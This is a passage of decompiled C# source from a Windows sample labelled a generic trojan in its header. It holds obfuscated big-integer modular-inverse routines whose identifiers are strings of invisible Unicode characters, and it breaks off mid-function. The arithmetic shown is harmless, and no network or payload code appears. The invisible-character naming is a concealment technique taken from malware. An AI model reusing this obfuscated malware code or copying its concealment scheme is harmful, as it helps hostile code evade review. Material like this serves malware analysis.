// Decompiled with JetBrains decompiler
// Type: ‌‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮
// Assembly: ReadLineS0SAT, Version=2.0.8.1, Culture=neutral, PublicKeyToken=null
// MVID: 826822DE-6F21-4D67-9238-0DAF50EB618B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-9ec8f988ff41765b68c6a4d29d259fafb62e97ad2d3633c43fbe0ab0dd12518d.exe

using System;

internal abstract class \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮
{
  private static readonly \u200D​⁪‮​‫⁯⁮‪‫‪‍⁪⁮⁫‮​⁯⁪⁫⁫‬‮‎‫‎⁪⁮‮‎‌⁬‮‫⁫‬‮‌⁪‭‮ \u206A‬​⁫‫‪⁮⁮‬‬⁯⁮‮‏‏⁯‍⁪⁮⁫‏⁬‮‫⁯⁪‏‭⁫‭⁬‎‫⁪‏‎‍‪‭‮‮ = new \u200D​⁪‮​‫⁯⁮‪‫‪‍⁪⁮⁫‮​⁯⁪⁫⁫‬‮‎‫‎⁪⁮‮‎‌⁬‮‫⁫‬‮‌⁪‭‮();
  private const int \u202D⁬‭‪‭‮‬‍‏‌‏⁭‭​‏‪‮‪‫⁭⁬‮⁮‮‭‍‭⁯‫‪‭‭‬‫‌⁯​‬‪⁫‮ = 1073741823;
  private const ulong \u202D‫⁮‌⁭‎‫⁫‪‮‏⁮‪‫‪⁫⁪⁬⁫‍‭​⁪⁪‭⁭⁫​‎‍⁯⁭⁬‭‬‌‭⁮‌‪‮ = 4294967295;

  public static void \u200E⁯⁬​‬⁭‏​⁭‎⁬‪‌‍‎⁭‍⁫‮‌⁮⁭‭​‮‫‎‏‫‫‮⁯‮‪​‌⁯​⁪‍‮(
    uint[] _param0,
    uint[] _param1,
    uint[] _param2)
  {
    if (\u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u200E‭‌‫‬‬⁪‫‫⁫⁭⁬⁭‏‌⁬‬‏⁯⁮‫‪‫‬‫⁯‬‏‌‎‪​​​‌⁫‌⁯⁪⁯‮(_param0, _param1, _param2) == 0U)
      throw new ArithmeticException("Inverse does not exist.");
  }

  public static void \u202B⁭‬‏‎⁫​​⁯‎⁭‬⁫‮‍⁪⁯‭⁭‭‫⁪‬‎‌‮‍⁪‎‎‪⁭‬‍⁯‭‮⁪⁫‍‮(
    uint[] _param0,
    uint[] _param1,
    uint[] _param2)
  {
    if (!\u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u200F‏‭‎​‮⁯​‬‮‭⁭⁮⁮‏⁭‌⁯‍⁯‬⁫‫‍‬‎⁮⁬​⁭⁯‎‬‌‍⁫‎‎⁪⁬‮(_param0, _param1, _param2))
      throw new ArithmeticException("Inverse does not exist.");
  }

  public static uint \u202C‍⁭‭‏‌‏‫⁭‭‭​‭⁭⁫‎‮⁭‏‮⁭⁮⁪‭‪​‎‬⁪⁫‏​⁫‎‮⁯‮⁬‏⁫‮(uint _param0)
  {
    uint num1 = _param0;
    uint num2 = num1 * (uint) (2 - (int) _param0 * (int) num1);
    uint num3 = num2 * (uint) (2 - (int) _param0 * (int) num2);
    uint num4 = num3 * (uint) (2 - (int) _param0 * (int) num3);
    return num4 * (uint) (2 - (int) _param0 * (int) num4);
  }

  public static uint \u200E‭‌‫‬‬⁪‫‫⁫⁭⁬⁭‏‌⁬‬‏⁯⁮‫‪‫‬‫⁯‬‏‌‎‪​​​‌⁫‌⁯⁪⁯‮(
    uint[] _param0,
    uint[] _param1,
    uint[] _param2)
  {
    int length1 = _param0.Length;
    int num1 = (length1 << 5) - \u202A⁯⁪⁮‌‫‍‎‬‫⁯⁪⁪⁯⁮‍‫‫‫⁯⁪‭​⁬‬‏​‭‎‪⁯‮​​‬​‌‎‏⁪‮.\u206F‍‫⁯‮‍‍⁮‪‭⁬‫‬‍‫‭⁯⁬‪‭‫‪‌‍‪⁪⁬⁫‏⁮‍‍⁭‍‍​⁭‪⁬‫‮((int) _param0[length1 - 1]);
    int length2 = (num1 + 29) / 30;
    int[] numArray1 = new int[4];
    int[] numArray2 = new int[length2];
    int[] numArray3 = new int[length2];
    int[] destinationArray = new int[length2];
    int[] numArray4 = new int[length2];
    int[] sourceArray = new int[length2];
    numArray3[0] = 1;
    \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u200F⁯⁯‏‬⁬⁪‮‮‏⁯‍​⁯‌‎⁫‪⁯⁫‫‌​⁯‭‬‎⁯‎‭​‪⁫⁮‭‏⁬⁬⁮‍‮(num1, _param1, 0, numArray4, 0);
    \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u200F⁯⁯‏‬⁬⁪‮‮‏⁯‍​⁯‌‎⁫‪⁯⁫‫‌​⁯‭‬‎⁯‎‭​‪⁫⁮‭‏⁬⁬⁮‍‮(num1, _param0, 0, sourceArray, 0);
    Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 0, length2);
    int num2 = -1;
    int num3 = (int) \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u202C‍⁭‭‏‌‏‫⁭‭‭​‭⁭⁫‎‮⁭‏‮⁭⁮⁪‭‪​‎‬⁪⁫‏​⁫‎‮⁯‮⁬‏⁫‮((uint) sourceArray[0]);
    int num4 = \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u206E‭⁫​‬⁯​‎‪​‌‬‎⁭‭‪⁯‫‬⁬‌‬‌‏‮‪‎‮⁭⁯‫‎‌‫‮‬⁫⁪‬⁮‮(num1);
    for (int index = 0; index < num4; index += 30)
    {
      num2 = \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u202D⁯​‌⁪‍‮‫‌⁮⁭⁭⁭‪⁪​‌‬‬‍‫⁫​⁯⁭‫‪‭‏‮⁭‎‏‪⁮​‪‪⁫‮‮(num2, destinationArray[0], numArray4[0], numArray1);
      \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u200F‫‬‮⁫⁪‪‭‭⁯⁮⁮‭​‪⁭‮⁪‌‏‏‭‫⁯‮⁫‫‫‌‏‌⁮‌‎​‪⁬‌⁬⁭‮(length2, numArray2, numArray3, numArray1, num3, sourceArray);
      \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u206F⁯‏⁮‮‌‏⁭⁭‬‮‭‍‎‍​‮⁯‏‬⁬‭⁫‭‍⁯‮‫​⁫⁮‎⁪⁫‏‪⁯⁬‬‭‮(length2, destinationArray, numArray4, numArray1);
    }
    int num5 = destinationArray[length2 - 1] >> 31;
    \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u206D‌⁪‫‌⁪⁫‮‎​​‮⁪​⁯‍‎‏⁫‌⁬‮‬⁪​‎‌⁪⁭‬‍‍⁫​‌⁪⁯‍⁪‌‮(length2, num5, destinationArray);
    \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u206D⁯‌​‬‬‭‌‏⁪‭‬​‬‪‫‪‌‍‮‪‭​‭‎⁫‪⁫‍⁬⁫⁫⁪⁭‫‮⁮⁭‪⁭‮(length2, num5, numArray2, sourceArray);
    \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u206B‍‏⁮‭⁬‬​‍‬‎​⁬‌⁬‪⁮⁯‫‭‭⁫‭‫‍‍‍⁮‏‍⁫‌⁭​‫‬‬​‮⁮‮(num1, numArray2, 0, _param2, 0);
    return (uint) (\u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u200C‪‌⁭‮‫⁭‌⁮‎‫‍⁮⁯‪‍‪⁫⁭‬‌⁯‪⁮‏⁮‫⁭‮‍⁫⁫⁭⁪‪‬‬‭‮‮‮(length2, destinationArray, 1) & \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u200C‏‎⁯‭‏‌⁫⁯‎⁭‏‪‎‫⁮​‍‎‪‬⁮⁬‭⁪‭⁬⁬⁯⁯⁫⁯⁪‬​‭⁬⁭‌‎‮(length2, numArray4));
  }

  public static bool \u200F‏‭‎​‮⁯​‬‮‭⁭⁮⁮‏⁭‌⁯‍⁯‬⁫‫‍‬‎⁮⁬​⁭⁯‎‬‌‍⁫‎‎⁪⁬‮(
    uint[] _param0,
    uint[] _param1,
    uint[] _param2)
  {
    int length1 = _param0.Length;
    int num1 = (length1 << 5) - \u202A⁯⁪⁮‌‫‍‎‬‫⁯⁪⁪⁯⁮‍‫‫‫⁯⁪‭​⁬‬‏​‭‎‪⁯‮​​‬​‌‎‏⁪‮.\u206F‍‫⁯‮‍‍⁮‪‭⁬‫‬‍‫‭⁯⁬‪‭‫‪‌‍‪⁪⁬⁫‏⁮‍‍⁭‍‍​⁭‪⁬‫‮((int) _param0[length1 - 1]);
    int length2 = (num1 + 29) / 30;
    int[] numArray1 = new int[4];
    int[] numArray2 = new int[length2];
    int[] numArray3 = new int[length2];
    int[] destinationArray = new int[length2];
    int[] numArray4 = new int[length2];
    int[] sourceArray = new int[length2];
    numArray3[0] = 1;
    \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u200F⁯⁯‏‬⁬⁪‮‮‏⁯‍​⁯‌‎⁫‪⁯⁫‫‌​⁯‭‬‎⁯‎‭​‪⁫⁮‭‏⁬⁬⁮‍‮(num1, _param1, 0, numArray4, 0);
    \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u200F⁯⁯‏‬⁬⁪‮‮‏⁯‍​⁯‌‎⁫‪⁯⁫‫‌​⁯‭‬‎⁯‎‭​‪⁫⁮‭‏⁬⁬⁮‍‮(num1, _param0, 0, sourceArray, 0);
    Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 0, length2);
    int num2 = -1 - (\u202A⁯⁪⁮‌‫‍‎‬‫⁯⁪⁪⁯⁮‍‫‫‫⁯⁪‭​⁬‬‏​‭‎‪⁯‮​​‬​‌‎‏⁪‮.\u206F‍‫⁯‮‍‍⁮‪‭⁬‫‬‍‫‭⁯⁬‪‭‫‪‌‍‪⁪⁬⁫‏⁮‍‍⁭‍‍​⁭‪⁬‫‮(numArray4[length2 - 1] | 1) - (length2 * 30 + 2 - num1));
    int num3 = length2;
    int num4 = length2;
    int num5 = (int) \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u202C‍⁭‭‏‌‏‫⁭‭‭​‭⁭⁫‎‮⁭‏‮⁭⁮⁪‭‪​‎‬⁪⁫‏​⁫‎‮⁯‮⁬‏⁫‮((uint) sourceArray[0]);
    int num6 = \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u206E‭⁫​‬⁯​‎‪​‌‬‎⁭‭‪⁯‫‬⁬‌‬‌‏‮‪‎‮⁭⁯‫‎‌‫‮‬⁫⁪‬⁮‮(num1);
    int num7 = 0;
    while (!\u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u202A⁮‍‬‫‌⁫‬‍⁮⁭‍‎‭‌‍‬‫⁬‪⁬⁬‬‫⁭‮⁪‮‬​‏‍​⁫⁭‏‌⁭​⁫‮(num4, numArray4))
    {
      if (num7 >= num6)
        return false;
      num7 += 30;
      num2 = \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u200C⁭⁭‮‬‏⁭⁮​‏‭‎⁯⁫‮​⁫‍⁭​⁫⁮⁮⁭‫⁮‭‮‭⁮​​​‏⁬​‫‌‫⁬‮(num2, destinationArray[0], numArray4[0], numArray1);
      \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u200F‫‬‮⁫⁪‪‭‭⁯⁮⁮‭​‪⁭‮⁪‌‏‏‭‫⁯‮⁫‫‫‌‏‌⁮‌‎​‪⁬‌⁬⁭‮(num3, numArray2, numArray3, numArray1, num5, sourceArray);
      \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u206F⁯‏⁮‮‌‏⁭⁭‬‮‭‍‎‍​‮⁯‏‬⁬‭⁫‭‍⁯‮‫​⁫⁮‎⁪⁫‏‪⁯⁬‬‭‮(num4, destinationArray, numArray4, numArray1);
      int num8 = destinationArray[num4 - 1];
      int num9 = numArray4[num4 - 1];
      if ((num4 - 2 >> 31 | num8 ^ num8 >> 31 | num9 ^ num9 >> 31) == 0)
      {
        destinationArray[num4 - 2] |= num8 << 30;
        numArray4[num4 - 2] |= num9 << 30;
        --num4;
      }
    }
    int num10 = destinationArray[num4 - 1] >> 31;
    int num11 = numArray2[num3 - 1] >> 31;
    if (num11 < 0)
      num11 = \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u206B⁬⁪‭‭‌⁯‌‏⁭‭⁪​‎‌⁭⁯​⁪‬‪⁮‮​⁬‭⁯‍‌⁬‭⁯‪‪⁮⁬⁮‪⁬⁯‮(num3, numArray2, sourceArray);
    if (num10 < 0)
    {
      num11 = \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u202A​‪‍‫‭‌‭‪⁫⁯​⁮⁭⁬⁯‭⁯‮‏‭‍‭‭‎⁭⁯‮‮⁪⁯⁬⁬‍‎‏‍‍‭‮(num3, numArray2);
      \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u202A​‪‍‫‭‌‭‪⁫⁯​⁮⁭⁬⁯‭⁯‮‏‭‍‭‭‎⁭⁯‮‮⁪⁯⁬⁬‍‎‏‍‍‭‮(num4, destinationArray);
    }
    if (!\u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u202E⁪‫​⁭‬‌‭‮‏‫​‌‍⁮‬‌⁭‏⁯‬⁮‪‪⁬‬⁯⁬‏‍‫⁬‌‮⁯​‭‎‫⁪‮(num4, destinationArray))
      return false;
    if (num11 < 0)
      \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u206B⁬⁪‭‭‌⁯‌‏⁭‭⁪​‎‌⁭⁯​⁪‬‪⁮‮​⁬‭⁯‍‌⁬‭⁯‪‪⁮⁬⁮‪⁬⁯‮(num3, numArray2, sourceArray);
    \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u206B‍‏⁮‭⁬‬​‍‬‎​⁬‌⁬‪⁮⁯‫‭‭⁫‭‫‍‍‍⁮‏‍⁫‌⁭​‫‬‬​‮⁮‮(num1, numArray2, 0, _param2, 0);
    return true;
  }

  public static uint[] \u206A‫⁯‭⁯⁭‫‌‍​⁭‬‮‪⁭⁭⁬⁯‍​‌‮‪⁪‬⁮⁭‬‌⁬⁬⁬‌‭‏‏⁭⁬​‏‮(uint[] _param0)
  {
    int length = _param0.Length;
    uint[] numArray = \u206A‪‪⁫‬⁯‪‏‫⁬⁬⁮‮⁬⁪‎‌⁫‮‏⁭⁪⁯​‮‍⁭‏​⁪⁯‎‏‪‬⁮⁪‏‫‏‮.\u202C⁪‮⁬​​⁯⁯​‏‎⁭⁯‭‪​‍‏‍‎⁬⁫⁮⁮‬⁭⁫⁭‪⁮​​‏‫‍‮‬‮‌‬‮(length);
    uint num1 = _param0[length - 1];
    uint num2 = num1 | num1 >> 1;
    uint num3 = num2 | num2 >> 2;
    uint num4 = num3 | num3 >> 4;
    uint num5 = num4 | num4 >> 8;
    uint num6 = num5 | num5 >> 16;
    do
    {
      byte[] buffer = new byte[length << 2];
      ((Random) \u200C‮⁮⁬‮⁯‬‏​‬‎‭‭⁯‍⁮‮⁪⁭⁭⁪‭⁯‫‬⁪⁮‏‏⁬‭‪⁭​‪‬‍⁪‪‌‮.\u206A‬​⁫‫‪⁮⁮‬‬⁯⁮‮‏‏⁯‍⁪⁮⁫‏⁬‮‫⁯⁪‏‭⁫‭⁬‎‫⁪‏‎‍‪‭‮‮).NextBytes(buffer);
      \u200F⁬‏‬⁭⁬⁮‮⁪‌‎⁯‮⁪⁯⁭⁯⁮‏‭⁪⁭⁬‭‍​⁮‍⁯‌‌⁬⁬⁫⁭‎‫​‍⁪‮.\u206B‪‍‏‮‭⁭‍‭‍‎⁫‪⁯‏⁬‌⁬‬‭⁭‌​​⁬‍⁯‭‮⁪‫⁯‬‫⁮‏‭​‫‪‮(buffer, 0, numArray);
      numArray[length - 1] &= num6;
    }
    while (\u206A‪‪⁫‬⁯‪‏‫⁬⁬⁮‮⁬⁪‎‌⁫‮‏⁭⁪⁯​‮‍⁭‏​⁪⁯‎‏‪‬⁮⁪‏‫‏‮.\u206F‫⁪‌​⁬⁫⁪⁫⁪‮‬⁮‪​⁬‎‎‍⁮⁮⁬‬‎⁪⁬​‭⁭⁮‫‪⁭‌⁬‪​‏⁯⁭‮(length, numArray, _param0));
    return numArray;
  }

  private static int \u206B⁬⁪‭‭‌⁯‌‏⁭‭⁪​‎‌⁭⁯​⁪‬‪⁮‮​⁬‭⁯‍‌⁬‭⁯‪‪⁮⁬⁮‪⁬⁯‮(
    int _param0,
    int[] _param1,
    int[] _param2)
  {
    int num1 = 0;
    int index1 = _param0 - 1;
    for (int index2 = 0; index2 < index1; ++index2)
    {
      int num2 = num1 + (_param1[index2] + _param2[index2]);
      _param1[index2] = num2 & 1073741823;
      num1 = num2 >> 30;
    }
    int num3 = num1 + (_param1[index1] + _param2[index1]);
    _param1[index1] = num3;
    return num3 >> 30;
  }

  private static void \u206D‌⁪‫‌⁪⁫‮‎​​‮⁪​⁯‍‎‏⁫‌⁬‮‬⁪​‎‌⁪⁭‬‍‍⁫​‌⁪⁯‍⁪‌‮(
    int _param0,
    int _param1,
    int[] _param2)
  {
    int num1 = 0;
    int index1 = _param0 - 1;
    for (int index2 = 0; index2 < index1; ++index2)
    {
      int num2 = num1 + ((_param2[index2] ^ _param1) - _param1);
      _param2[index2] = num2 & 1073741823;
      num1 = num2 >> 30;
    }
    int num3 = num1 + ((_param2[index1] ^ _param1) - _param1);
    _param2[index1] = num3;
  }

  private static void \u206D⁯‌​‬‬‭‌‏⁪‭‬​‬‪‫‪‌‍‮‪‭​‭‎⁫‪⁫‍⁬⁫⁫⁪⁭‫‮⁮⁭‪⁭‮(
    int _param0,
    int _param1,
    int[] _param2,
    int[] _param3)
  {
    int index1 = _param0 - 1;
    int num1 = 0;
    int num2 = _param2[index1] >> 31;
    for (int index2 = 0; index2 < index1; ++index2)
    {
      int num3 = (_param2[index2] + (_param3[index2] & num2) ^ _param1) - _param1;
      int num4 = num1 + num3;
      _param2[index2] = num4 & 1073741823;
      num1 = num4 >> 30;
    }
    int num5 = (_param2[index1] + (_param3[index1] & num2) ^ _param1) - _param1;
    int num6 = num1 + num5;
    _param2[index1] = num6;
    int num7 = 0;
    int num8 = _param2[index1] >> 31;
    for (int index3 = 0; index3 < index1; ++index3)
    {
      int num9 = _param2[index3] + (_param3[index3] & num8);
      int num10 = num7 + num9;
      _param2[index3] = num10 & 1073741823;
      num7 = num10 >> 30;
    }
    int num11 = _param2[index1] + (_param3[index1] & num8);
    int num12 = num7 + num11;
    _param2[index1] = num12;
  }

  private static void \u206B‍‏⁮‭⁬‬​‍‬‎​⁬‌⁬‪⁮⁯‫‭‭⁫‭‫‍‍‍⁮‏‍⁫‌⁭​‫‬‬​‮⁮‮(
    int _param0,
    int[] _param1,
    int _param2,
    uint[] _param3,
    int _param4)
  {
    int num1 = 0;
    ulong num2 = 0;
    for (; _param0 > 0; _param0 -= 32)
    {
      for (; num1 < Math.Min(32, _param0); num1 += 30)
        num2 |= (ulong) _param1[_param2++] << num1;
      _param3[_param4++] = (uint) num2;
      num2 >>= 32;
      num1 -= 32;
    }
  }

  private static int \u202D⁯​‌⁪‍‮‫‌⁮⁭⁭⁭‪⁪​‌‬‬‍‫⁫​⁯⁭‫‪‭‏‮⁭‎‏‪⁮​‪‪⁫‮‮(
    int _param0,
    int _param1,
    int _param2,
    int[] _param3)
  {
    int num1 = 1;
    int num2 = 0;
    int num3 = 0;
    int num4 = 1;
    int num5 = _param1;
    int num6 = _param2;
    for (int index = 0; index < 30; ++index)
    {
      int num7 = _param0 >> 31;
      int num8 = -(num6 & 1);
      int num9 = (num5 ^ num7) - num7;
      int num10 = (num1 ^ num7) - num7;
      int num11 = (num2 ^ num7) - num7;
      int num12 = num6 + (num9 & num8);
      num3 += num10 & num8;
      num4 += num11 & num8;
      int num13 = num7 & num8;
      _param0 = (_param0 ^ num13) - (num13 + 1);
      num5 += num12 & num13;
      int num14 = num1 + (num3 & num13);
      int num15 = num2 + (num4 & num13);
      num6 = num12 >> 1;
      num1 = num14 << 1;
      num2 = num15 << 1;
    }
    _param3[0] = num1;
    _param3[1] = num2;
    _param3[2] = num3;
    _param3[3] = num4;
    return _param0;
  }

  private static int \u200C⁭⁭‮‬‏⁭⁮​‏‭‎⁯⁫‮​⁫‍⁭​⁫⁮⁮⁭‫⁮‭‮‭⁮​​​‏⁬​‫‌‫⁬‮(
    int _param0,
    int _param1,
    int _param2,
    int[] _param3)
  {
    int num1 = 1;
    int num2 = 0;
    int num3 = 0;
    int num4 = 1;
    int num5 = _param1;
    int num6 = _param2;
    int num7 = 30;
    while (true)
    {
      int num8 = \u202A⁯⁪⁮‌‫‍‎‬‫⁯⁪⁪⁯⁮‍‫‫‫⁯⁪‭​⁬‬‏​‭‎‪⁯‮​​‬​‌‎‏⁪‮.\u202B‮⁪‏⁫⁮⁪‮​⁮⁮‌⁪⁮⁯‎‭⁭‫⁬‎⁬‌​⁪‬⁪‫⁪‍⁫‎⁫‮⁯‏‌‬⁬‎‮(num6 | -1 << num7);
      int num9 = num6 >> num8;
      num1 <<= num8;
      num2 <<= num8;
      _param0 -= num8;
      num7 -= num8;
      if (num7 > 0)
      {
        int num10;
        if (_param0 < 0)
        {
          _param0 = -_param0;
          int num11 = num5;
          num5 = num9;
          num9 = -num11;
          int num12 = num1;
          num1 = num3;
          num3 = -num12;
          int num13 = num2;
          num2 = num4;
          num4 = -num13;
          int num14 = (int) (uint.MaxValue >> 32 - (_param0 + 1 > num7 ? num7 : _param0 + 1)) & 63;
          num10 = num5 * num9 * (num5 * num5 - 2) & num14;
        }
        else
        {
          int num15 = (int) (uint.MaxValue >> 32 - (_param0 + 1 > num7 ? num7 : _param0 + 1)) & 15;
          num10 = -(num5 + ((num5 + 1 & 4) << 1)) * num9 & num15;
        }
        num6 = num9 + num5 * num10;
        num3 += num1 * num10;
        num4 += num2 * num10;
      }
      else
        break;
    }
    _param3[0] = num1;
    _param3[1] = num2;
    _param3[2] = num3;
    _param3[3] = num4;
    return _param0;
  }

  private static void \u200F⁯⁯‏‬⁬⁪‮‮‏⁯‍​⁯‌‎⁫‪⁯⁫‫‌​⁯‭‬‎⁯‎‭​‪⁫⁮‭‏⁬⁬⁮‍‮(
    int _param0,
    uint[] _param1,
    int _param2,
    int[] _param3,
    int _param4)
  {
    int num1 = 0;
    ulong num2 = 0;
    for (; _param0 > 0; _param0 -= 30)
    {
      if (num1 < Math.Min(30, _param0))
      {
        num2 |= (ulong) (((long) _param1[_param2++] & (long) uint.MaxValue) << num1);
        num1 += 32;
      }
      _param3[_param4++] = (int) num2 & 1073741823;
      num2 >>= 30;
      num1 -= 30;
    }
  }

  private static int \u200C‪‌⁭‮‫⁭‌⁮‎‫‍⁮⁯‪‍‪⁫⁭‬‌⁯‪⁮‏⁮‫⁭‮‍⁫⁫⁭⁪‪‬‬‭‮‮‮(
    int _param0,
    int[] _param1,
    int _param2)
  {
    int num = _param1[0] ^ _param2;
    for (int index = 1; index < _param0; ++index)
      num |= _param1[index];
    return ((int) ((uint) num >> 1) | num & 1) - 1 >> 31;
  }

  private static int \u200C‏‎⁯‭‏‌⁫⁯‎⁭‏‪‎‫⁮​‍‎‪‬⁮⁬‭⁪‭⁬⁬⁯⁯⁫⁯⁪‬​‭⁬⁭‌‎‮(int _param0, int[] _param1)
  {
    int num = 0;
    for (int index = 0; index < _param0; ++index)
      num |= _param1[index];
    return ((int) ((uint) num >> 1) | num & 1) - 1 >> 31;
  }

  private static int \u206E‭⁫​‬⁯​‎‪​‌‬‎⁭‭‪⁯‫‬⁬‌‬‌‏‮‪‎‮⁭⁯‫‎‌‫‮‬⁫⁪‬⁮‮(int _param0) => (49 * _param0 + (_param0 < 46 ? 80 : 47)) / 17;

  private static bool \u202E⁪‫​⁭‬‌‭‮‏‫​‌‍⁮‬‌⁭‏⁯‬⁮‪‪⁬‬⁯⁬‏‍‫⁬‌‮⁯​‭‎‫⁪‮(int _param0, int[] _param1)
  {
    if (_param1[0] != 1)
      return false;
    for (int index = 1; index < _param0; ++index)
    {
      if (_param1[index] != 0)
        return false;
    }
    return true;
  }

  private static bool \u202A⁮‍‬‫‌⁫‬‍⁮⁭‍‎‭‌‍‬‫⁬‪⁬⁬‬‫⁭‮⁪‮‬​‏‍​⁫⁭‏‌⁭​⁫‮(int _param0, int[] _param1)
  {
    if (_param1[0] != 0)
      return false;
    for (int index = 1; index < _param0; ++index)
    {
      if (_param1[index] != 0)
        return false;
    }
    return true;
  }

  private static int \u202A​‪‍‫‭‌‭‪⁫⁯​⁮⁭⁬⁯‭⁯‮‏‭‍‭‭‎⁭⁯‮‮⁪⁯⁬⁬‍‎‏‍‍‭‮(int _param0, int[] _param1)
  {
    int num1 = 0;
    int index1 = _param0 - 1;
    for (int index2 = 0; index2 < index1; ++index2)
    {
      int num2 = num1 - _param1[index2];
      _param1[index2] = num2 & 1073741823;
      num1 = num2 >> 30;
    }
    int num3 = num1 - _param1[index1];
    _param1[index1] = num3;
    return num3 >> 30;
  }

  private static void \u200F‫‬‮⁫⁪‪‭‭⁯⁮⁮‭​‪⁭‮⁪‌‏‏‭‫⁯‮⁫‫‫‌‏‌⁮‌‎​‪⁬‌⁬⁭‮(
    int _param0,
    int[] _param1,
    int[] _param2,
    int[] _param3,
    int _param4,
    int[] _param5)
  {
    int num1 = _param3[0];
    int num2 = _param3[1];
    int num3 = _param3[2];
    int num4 = _param3[3];
    int num5 = _param1[_param0 - 1] >> 31;
    int num6 = _param2[_param0 - 1] >> 31;
    int num7 = (num1 & num5) + (num2 & num6);
